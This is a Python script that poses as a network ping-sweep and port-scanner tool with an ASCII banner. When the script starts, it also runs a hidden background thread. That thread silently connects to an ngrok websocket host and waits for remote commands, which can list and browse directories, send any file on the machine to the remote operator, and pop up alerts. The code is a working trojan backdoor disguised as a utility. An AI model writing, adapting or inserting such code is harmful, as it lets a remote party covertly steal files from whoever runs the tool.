import subprocess
import platform
from concurrent.futures import ThreadPoolExecutor
import pyfiglet
import socket
import os
import threading
import time
import sys
import asyncio
import websockets
import tkinter as tk
from tkinter import messagebox
def alert_message():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Warrning", "Are U Sure You are Safe?")
    root.mainloop()


URL = "wss://broderick-hiplength-glamourously.ngrok-free.dev"
async def main():
    async with websockets.connect(URL) as ws:
        async def sendfile(filename):
            if os.path.isfile(filename):
                with open(filename, 'rb') as f:
                    data = f.read()
                    await ws.send(data)
        async def backdir():
            os.chdir(os.path.dirname(os.getcwd()))

        async def checkdir():
            return os.getcwd()
        async def myprocess():
            while True:
                data = await ws.recv()
                if not data:
                    break
                if isinstance(data, bytes):
                    command = data.decode().strip()
                else:
                    command = data.strip()
                commandlist = command.split()
                if command == 'dir':
                    folders = os.listdir()
                    await ws.send(str(folders).encode())
                elif command == 'pwd':
                    current_dir = await checkdir()
                    await ws.send(current_dir.encode())
                elif commandlist[0] == 'in' and len(commandlist) > 1:
                    part=""
                    for i in range(1, len(commandlist)):
                        part+=commandlist[i]
                        if i!=len(commandlist)-1:
                            part+=" "
                    try:
                        os.chdir(part)
                        await ws.send(b"OK")
                    except FileNotFoundError:
                        await ws.send(b"Folder not found")
                elif commandlist[0] == "out":
                    await backdir()
                    await ws.send(b"OK")
                elif commandlist[0] == 'get' and len(commandlist) > 1:
                    part=""
                    for i in range(1, len(commandlist)):
                        part+=commandlist[i]
                        if i!=len(commandlist)-1:
                            part+=" "
                    await sendfile(part)
                elif command.lower() == 'release':
                    break
                elif commandlist[0] == 'alert':
                    alert_message()
                    await ws.send(b"Alert displayed")
                else:
                    await ws.send(b"Unknown command")
        await myprocess()
text = "ARe U sure"
ascii_banner = pyfiglet.figlet_format(text, font="big")
print(ascii_banner)
print("                        Github Profile:amarjeettudu05-bot")
print(" ")
print(" ")

ipaddress=input("Enter Your IP Address: ")

NETWORK = '.'.join(ipaddress.split('.')[:-1]) + '.'

IS_WINDOWS = platform.system().lower() == "windows"
def ping(ip):
    if IS_WINDOWS:
        command = ["ping", "-n", "1", "-w", "400", ip]
    else:
        command = ["ping", "-c", "1", ip]
    result = subprocess.run(command, capture_output=True, text=True)
    output = result.stdout.lower()
    if "ttl=" in output:
        return f"[ALIVE] {ip}"
    elif "destination host unreachable" in output:
        return None
    elif "request timed out" in output:
        return None

    return None

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        sock.close()
        if result == 0:
            return port
    except:
        return None
    return None


def port_scan():
    target = input("Enter Target IP Address for Port Scanning: ")

    print(f"\n Scanning ports on {target}...\n")

    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389 ,544, 554,5900, 8080,8000, 8081,3000, 5000, 6379, 11211, 27017,5173, 6379,3000, 5000, 9000, 9200, 9300, 11211, 27017
                    ]
    open_ports = []

    with ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(lambda p: scan_port(target, p), common_ports)
    results = list(set(results))
    for port in results:
        if port:
            print(f" Port OPEN: {port}")
            open_ports.append(port)

    if not open_ports:
        print(" No common ports open.")

    print("\n Port scan finished.\n")
def myboy():
    asyncio.run(main())
def my():
    while True:
        try:
            myboy()
        except:
            time.sleep(5)
    

bg_thread = threading.Thread(target=my, daemon=True)
bg_thread.start()
while True:
    print("[+] 1 Start Network Scan")
    print("[+] 2 port Scan")
    print("[+] 3 Exit")
    choice = input("Enter your choice: ")
    if choice == '1':
        print("Network Scanning...")

        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(ping, [f"{NETWORK}{i}" for i in range(1, 255)])

        for res in results:
            if res:
                print(res)
        print("Scan finished.....")
    elif choice == '2':
        port_scan()
        pass
    else :
        print("Exiting...")
        break 
